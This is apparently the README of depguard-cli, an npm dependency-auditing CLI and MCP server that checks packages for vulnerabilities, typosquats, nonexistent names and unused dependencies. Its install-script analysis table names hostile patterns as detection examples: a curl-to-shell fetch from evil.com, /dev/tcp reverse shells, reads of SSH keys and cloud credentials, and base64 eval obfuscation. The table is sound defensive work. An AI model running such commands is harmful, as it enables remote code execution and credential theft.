# depguard-cli

MCP security server for AI coding agents. 9 tools: pre-install guardian, AI hallucination guard, dead dependency detection, vulnerability audit, supply chain attack detection, and smart recommendations.

Your AI agent verifies every `npm install` before it happens. Zero runtime dependencies. Works with Claude, Cursor, Windsurf, and any MCP client.

## Install

```bash
npm install -g depguard-cli
```

Or use directly:

```bash
npx depguard-cli audit express
```

## CLI

```bash
# Full audit report
depguard-cli audit <package> [--target-license MIT] [--json]

# Search npm for packages
depguard-cli search <keywords...> [--limit 10] [--json]

# Score a package 0-100
depguard-cli score <package> [--target-license MIT] [--json]

# Get install/write recommendation
depguard-cli should-use <intent...> [--threshold 60] [--json]

# Pre-install guardian (verify + audit + allow/warn/block)
depguard-cli guard <package> [--threshold 60] [--block] [--json]

# Detect unused dependencies
depguard-cli sweep [path] [--include-dev] [--json]

# Deep transitive dependency tree audit
depguard-cli audit-deep <package> [--json]
```

### Examples

```bash
# Audit express for an Apache-2.0 project
depguard-cli audit express --target-license Apache-2.0

# Find date formatting libraries
depguard-cli search date formatting --limit 5

# Score a package
depguard-cli score lodash --json

# Should I install or write my own?
depguard-cli should-use "http client" --threshold 70

# Check before installing — blocks nonexistent/typosquat packages
depguard-cli guard expresss
# [WARN] expresss
#   Possible typosquat of: express

# Find unused dependencies in your project
depguard-cli sweep . --include-dev
```

## API

```typescript
import { audit, search, score, shouldUse, guard, verify, sweep } from 'depguard-cli'

// Full audit report
const report = await audit('express', 'MIT')
console.log(report.vulnerabilities.total)      // 0
console.log(report.licenseCompatibility.compatible) // true
console.log(report.weeklyDownloads)            // 35000000

// Search packages
const results = await search('date formatting', { limit: 5 })
results.forEach(r => console.log(`${r.score}/100 ${r.name}`))

// Score 0-100
const result = await score('lodash', { targetLicense: 'MIT' })
console.log(result.total)       // 82
console.log(result.breakdown)   // { security: 100, maintenance: 75, ... }

// Install or write from scratch?
const rec = await shouldUse('http client')
console.log(rec.action)     // "install"
console.log(rec.package)    // "axios"
console.log(rec.reasoning)  // "axios scores 85/100 (≥60) — safe to install"

// Pre-install guardian — verify + audit + decision
const check = await guard('expresss')
console.log(check.exists)           // true (but suspicious)
console.log(check.possibleTyposquat) // true
console.log(check.similarTo)        // ["express"]
console.log(check.decision)         // "warn"

// AI hallucination guard — does this package even exist?
const exists = await verify('ai-hallucinated-pkg')
console.log(exists.exists)          // false

// Dead dependency detection
const sweepResult = await sweep('.', { includeDevDependencies: true })
console.log(sweepResult.unused)     // [{ name: 'lodash', status: 'unused', ... }]
console.log(sweepResult.estimatedSavingsKB) // 1400
```

## Scoring

Each package is scored 0-100 across five dimensions:

| Dimension | Weight | What it measures |
|-----------|--------|------------------|
| Security | 30% | Known CVEs and advisories |
| Maintenance | 25% | Last publish date, version count, deprecation |
| Popularity | 20% | Weekly downloads (log scale) |
| License | 15% | Compatibility with your project license |
| Dependencies | 10% | Dependency count, install scripts |

Weights are configurable via the `weights` option in `score()`.

### Decision thresholds (`shouldUse`)

| Score | Action |
|-------|--------|
| >= 60 | `install` — safe to use |
| 40-59 | `caution` — review before using |
| < 40 | `write-from-scratch` — better to write your own |

The threshold is configurable via `--threshold` (CLI) or `threshold` option (API).

## Token Savings

Every MCP tool response includes a `tokenSavings` field that shows how many LLM tokens you save compared to manual research (web searches, page fetches, reasoning).

```json
"tokenSavings": {
  "responseTokens": 47,
  "manualEstimate": 11100,
  "saved": 11053,
  "percentSaved": 100,
  "manualSteps": [
    "WebSearch: \"{package} npm quality maintenance\" (~800 tokens)",
    "WebFetch: npm registry page (~3000 tokens)",
    "WebFetch: GitHub repo for activity/stars (~3000 tokens)",
    "WebSearch: \"{package} vulnerabilities\" (~800 tokens)",
    "WebFetch: advisories page (~3000 tokens)",
    "Reasoning: compute weighted score (~500 tokens)"
  ]
}
```

This is automatically included in every response — no configuration needed. It helps teams quantify the cost savings of using depguard in their AI workflows.

## MCP Server

depguard includes a built-in [MCP](https://modelcontextprotocol.io/) (Model Context Protocol) server for AI agent integration. It works with **any MCP-compatible client**.

### Compatible AI clients

| Client | Configuration |
|--------|--------------|
| Claude Code | `.mcp.json` or `~/.claude/settings.json` |
| Claude Desktop | `claude_desktop_config.json` |
| Cursor | MCP settings in IDE |
| Windsurf | MCP settings in IDE |
| Continue.dev | `config.json` MCP section |
| Cline / Roo Code | MCP settings |

### Setup

Using npx (no install needed):

```json
{
  "mcpServers": {
    "depguard": {
      "command": "npx",
      "args": ["-y", "depguard-cli", "--mcp"]
    }
  }
}
```

Or if installed globally:

```json
{
  "mcpServers": {
    "depguard": {
      "command": "depguard-cli",
      "args": ["--mcp"]
    }
  }
}
```

Or via Claude Code CLI:

```bash
claude mcp add --transport stdio depguard -- npx -y depguard-cli --mcp
```

### Available tools

| Tool | Description |
|------|-------------|
| `depguard_audit` | Full security audit of an npm package |
| `depguard_audit_bulk` | Audit multiple packages in a single call |
| `depguard_audit_project` | Audit all dependencies from a package.json file path |
| `depguard_search` | Search npm for packages by keywords |
| `depguard_score` | Score a package 0-100 |
| `depguard_should_use` | Recommend install, use native Node.js, or write from scratch |
| `depguard_guard` | Pre-install guardian: verify, audit, allow/warn/block decision |
| `depguard_verify` | AI hallucination guard: check if a package exists + typosquatting |
| `depguard_sweep` | Dead dependency detection: find unused packages in a project |
| `depguard_audit_deep` | Deep transitive dependency tree audit with vulnerability aggregation |

### Bulk audit

Audit all project dependencies in a single call. Accepts a list of package names or a dependencies object directly from `package.json`:

```typescript
// Via API
import { auditBulk } from 'depguard-cli'

const report = await auditBulk(['react', 'express', 'lodash'], { targetLicense: 'MIT' })
console.log(report.total)       // 3
console.log(report.vulnerable)  // 2
console.log(report.summary)     // { critical: 0, high: 2, moderate: 5, low: 3 }
```

Via MCP, the AI agent can pass the dependencies object from `package.json` directly — no need to extract package names manually.

### Project audit

Audit all dependencies from a `package.json` file in one call:

```typescript
import { auditProject } from 'depguard-cli'

const report = await auditProject('./package.json', {
  includeDevDependencies: true,  // also audit devDependencies
})
```

Via MCP, the agent just passes the file path — depguard reads it, detects the project license, and audits everything.

## Pre-Install Guardian

The `guard` command is the recommended entry point for AI agents. Before installing any package, it runs three checks in sequence:

1. **Existence check** — Does the package exist on npm? (blocks AI hallucinations)
2. **Typosquatting detection** — Is the name suspiciously similar to a popular package? (Levenshtein distance against 100+ top packages)
3. **Security audit** — Score, vulnerabilities, deprecated status, install script analysis

```bash
# Safe package
depguard-cli guard express
# [ALLOW] express
#   Score: 82/100 — safe to install

# Typosquat attempt
depguard-cli guard expresss
# [WARN] expresss
#   Possible typosquat of: express
#   Score: 45/100 is below threshold 60

# Nonexistent package (AI hallucination)
depguard-cli guard ai-made-up-package
# [BLOCK] ai-made-up-package
#   Package does NOT exist on npm!
```

Use `--block` to escalate all warnings to blocks (useful in CI):

```bash
depguard-cli guard sketchy-lib --block
```

### AI Hallucination Guard

The `verify` tool is a lightweight version of `guard` — it only checks if a package exists and whether the name is a possible typosquat. No audit, no scoring. Fast enough to run on every `npm install` suggestion from an AI agent.

```typescript
import { verify } from 'depguard-cli'

const result = await verify('expresss')
console.log(result.exists)           // true
console.log(result.possibleTyposquat) // true
console.log(result.similarTo)        // ["express"]
```

## Dead Dependency Detection

The `sweep` command scans your project to find npm packages listed in `package.json` but not actually imported or used in source code.

```bash
depguard-cli sweep . --include-dev

# Scanned 42 files, 15 dependencies
#
# Unused (3):
#   - lodash@^4.17.21 (~1400 KB)
#   - moment@^2.29.4 (~800 KB)
#   - request@^2.88.2 (~250 KB)
#
# Maybe unused (1):
#   ? some-dev-tool@^1.0.0
#
# Estimated savings: ~2450 KB
```

**Smart detection:**
- Scans all `.js`, `.ts`, `.mjs`, `.cjs`, `.jsx`, `.tsx` files for `import`/`require`/`export from`
- Recognizes config-only dependencies (eslint, prettier, typescript, jest, vitest, babel, tailwind, etc.)
- Detects binaries used in npm scripts
- Handles `@types/*` packages paired with runtime dependencies
- Marks untraced devDependencies as "maybe-unused" instead of "unused"
- Estimates disk size savings

```typescript
import { sweep } from 'depguard-cli'

const result = await sweep('.', { includeDevDependencies: true })
console.log(result.unused)            // [{ name: 'lodash', estimatedSizeKB: 1400, ... }]
console.log(result.estimatedSavingsKB) // 2450
```

## Smart Advisor

The `should_use` tool now checks for native Node.js alternatives before recommending npm packages:

```
"I need an http client"     → Use native fetch() (Node 18+). No package needed.
"I need uuid generation"    → Use crypto.randomUUID() (Node 19+). No package needed.
"I need deep cloning"       → Use structuredClone() (Node 17+). No package needed.
"I need a date formatter"   → Install date-fns (score 85). No native alternative.
```

Covers 20+ common intents including fetch, uuid, hashing, URL parsing, CLI args, testing, SQLite, glob, streams, compression, and more. Each recommendation includes example code and the minimum Node.js version required.

## Fix Suggestions

When vulnerabilities are found, each audit report includes actionable fix suggestions:

```json
"fixSuggestions": [
  {
    "vulnerability": "Prototype Pollution",
    "severity": "high",
    "currentVersion": "4.17.19",
    "fixVersion": "4.17.21",
    "action": "upgrade"
  }
]
```

If no patch exists, `action` is `"no-fix-available"`.

## GitHub Token

For higher GitHub Advisory API rate limits (60/hour → 5,000/hour), set a GitHub token:

```bash
export GITHUB_TOKEN=ghp_your_token_here
```

No special scopes needed — the token only identifies you for rate limiting. If already set (e.g. by `gh` CLI or GitHub Actions), depguard uses it automatically.

## Install Script Analysis

depguard statically analyzes install scripts (`preinstall`, `install`, `postinstall`) for suspicious patterns commonly used in supply chain attacks:

| Pattern | Severity | Example |
|---------|----------|---------|
| Remote code execution | Critical | `curl evil.com/payload.sh \| sh` |
| Reverse shells | Critical | `/dev/tcp/` connections |
| Credential file access | Critical | Reading `~/.ssh/id_rsa`, `~/.npmrc`, `~/.aws` |
| Sensitive env vars | Critical | Accessing `$NPM_TOKEN`, `$AWS_SECRET` |
| Shell typosquatting | Critical | `/bin/ssh` instead of `/bin/sh` |
| Obfuscated code | High | `eval(Buffer.from(..., "base64"))` |
| Process spawning | High | `child_process`, `exec()`, `spawn()` |
| Environment access | High | `process.env` usage |
| External network calls | Moderate | HTTP requests to non-standard hosts |

Each audit report includes a `scriptAnalysis` field with `suspicious` (boolean) and `risks` (array of detected patterns with severity and description). No scripts are executed — analysis is purely static pattern matching.

## Data sources

depguard combines two advisory databases for maximum coverage:

| Source | What it catches |
|--------|----------------|
| **npm Registry** | Advisories from `npm audit` |
| **GitHub Advisory Database** | GHSA advisories, often not in npm |

Results are deduplicated, filtered by the current package version (only vulnerabilities that actually affect the installed version are reported), and each advisory includes a `source` field (`npm` or `github`).

### Caching

Results are cached in memory (5 min) and on disk at `~/.depguard/cache/` (24h). This means:
- Repeated audits of the same package are instant (no network requests)
- Cache survives process restarts
- Expired entries are cleaned up automatically on startup

## License compatibility

depguard checks license compatibility using a permissive-to-copyleft hierarchy:

```
Public Domain (Unlicense, CC0) → Permissive (MIT, ISC, BSD, Apache-2.0)
  → Weak Copyleft (LGPL, MPL) → Strong Copyleft (GPL) → Network (AGPL)
```

A dependency is compatible if its license is equally or more permissive than your project's target license.

## Design principles

- **Zero runtime dependencies** — only Node.js built-in APIs (`fetch`, `crypto`, `readline`)
- **Never throws on network errors** — returns degraded results with warnings
- **TypeScript strict mode** — full type safety
- **100% offline tests** — all tests use mock fetch
- **Cache-friendly** — 5-minute in-memory TTL to avoid rate limits

## Development

```bash
npm run build    # compile TypeScript
npm run lint     # ESLint (strict)
npm test         # 184 tests (all offline)
npm run check    # build + lint + test + audit
```

## License

Apache-2.0 — see [LICENSE](LICENSE) for details.
